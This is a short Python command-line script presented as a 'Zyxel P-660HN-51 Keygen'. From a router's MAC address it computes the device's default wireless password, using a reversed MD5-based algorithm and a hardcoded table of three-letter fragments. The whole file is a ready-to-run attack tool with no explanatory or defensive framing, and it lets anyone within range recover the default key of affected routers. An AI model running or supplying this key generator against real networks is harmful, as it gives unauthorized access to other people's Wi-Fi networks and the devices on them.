# Default ESSID is ZyXELXXXXX
# works for Zyxel P-660HN-51 using lower case (mac - 2)
# when label mac is '603197dfeea9' input is '603197dfeea7' and pwd length 10

import hashlib
import argparse

def p660hn_51(mac, length):

	junk = 'agnahaakeaksalmaltalvandanearmaskaspattbagbakbiebilbitblableblib'\
	'lyboabodbokbolbomborbrabrobrubudbuedaldamdegderdetdindisdraduedu'\
	'kdundypeggeieeikelgelvemueneengennertesseteettfeifemfilfinflofly'\
	'forfotfrafrifusfyrgengirglagregrogrygulhaihamhanhavheihelherhith'\
	'ivhoshovhuehukhunhushvaideildileinnionisejagjegjetjodjusjuvkaika'\
	'mkankarkleklikloknaknekokkorkrokrykulkunkurladlaglamlavletlimlin'\
	'livlomloslovluelunlurlutlydlynlyrlysmaimalmatmedmegmelmenmermilm'\
	'inmotmurmyemykmyrnamnednesnoknyenysoboobsoddodeoppordormoseospos'\
	'sostovnpaiparpekpenpepperpippopradrakramrarrasremrenrevrikrimrir'\
	'risrivromroprorrosrovrursagsaksalsausegseiselsensessilsinsivsjus'\
	'jyskiskoskysmisnesnusolsomsotspastistosumsussydsylsynsyvtaktalta'\
	'mtautidtietiltjatogtomtretuetunturukeullulvungurourtutevarvedveg'\
	'veivelvevvidvikvisvriyreyte'

	md5 = hashlib.md5()
	md5.update(mac.encode())

	p = ""
	summ = 0
	for b in md5.digest():
		d1 = hex(b)[2:].upper()
		if len(d1) == 1:
			d1 += d1
		p += d1
	summ = sum([ord(char) for char in p])

	i = summ % 265
	if summ & 1:
		s1 = hex(ord(junk[1 + i * 3 - 1]))[2:]
		s1 += hex(ord(junk[2 + i * 3 - 1]))[2:]
		s1 += hex(ord(junk[3 + i * 3 - 1]))[2:]
	else:
		s1 = hex(ord(junk[1 + i * 3 - 1]))[2:].upper()
		s1 += hex(ord(junk[2 + i * 3 - 1]))[2:].upper()
		s1 += hex(ord(junk[3 + i * 3 - 1]))[2:].upper()

	s2 = "%s%s%s%s%s%s%s" % (p[0], s1[0:2], p[1:3], s1[2:4], p[3:6], s1[4:6], p[6:])
	
	md52 = hashlib.md5()
	md52.update(s2.encode())
	hex_digest = ""
	for b in md52.digest():
		d2 = hex(b)[2:].upper()
		if len(d2) == 1:
			d2 += d2
		hex_digest += d2

	hex_digest = hex_digest[::-1].lower()
	key = hex_digest[0:length]
	print(key)


parser = argparse.ArgumentParser(description='Zyxel P-660HN-51 Keygen')
parser.add_argument('mac', help='Lowercase mac - 2')
parser.add_argument('-length', help='Key length', default=20, type=int)
args = parser.parse_args()

p660hn_51(args.mac, args.length)
